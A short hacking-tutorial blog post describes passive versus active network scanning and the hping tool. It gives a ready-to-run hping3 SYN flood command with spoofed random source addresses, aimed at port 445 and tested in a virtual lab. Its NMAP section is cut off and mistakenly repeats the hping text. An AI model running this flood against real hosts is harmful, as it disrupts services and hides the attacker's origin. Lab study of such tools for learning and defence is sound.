---
date: "2019-01-13"
title: "Network Scan"
category: "Hacking"
---
In general, there are two types of network scan.
1. Passive Scan (Whireshark, ARP Tables)
2. Active Scan (Hping, NMAP, Scapy...etc)

The difference between two is <b>passive</b> scan will not be recognized by targets. On the other hand, <b>active scan</b> will leave traces and requires more preparations before scanning the target system.
<br/>
<br/>
Today, we are going to cover some userfule <b>active</b> scan tools.


###Hping
>Hping is a command-line oriented TCP/IP packet assembler/analyzer.

List of features, including
+ TCP/IP packet analyzer
+ Support TCP, UDP, ICMP
+ Firewall testing
+ Port scanning
+ Remote OS fingerprinting
+ DoS attacks

####Basic Scan
```bash
`

```

####DoS Example
```bash

--flood: sent packets as fast as possible. Don't show replies.
--rand-dest: random destionation address mode. see the man.
-V -- Verbose
-c --count: packet count
-d --data: data size
-S --syn: set SYN flag
-w --win: winsize (default 64)
-p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
-s --baseport: base source port (default random)

hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source TARGET_ADDRESS
```

To test this case, I used Kali (attacker) and OWASP (victim) on VM virtual box.
![alt text](https://storage.googleapis.com/warrenlee/myBlog/network%20scan/DoS.png)

From Wireshark, we can see tons of TCP packets sent from Kali to OWASP server with random source IP address.

###NMAP
>Hping is a command-line oriented TCP/IP packet assembler/analyzer.


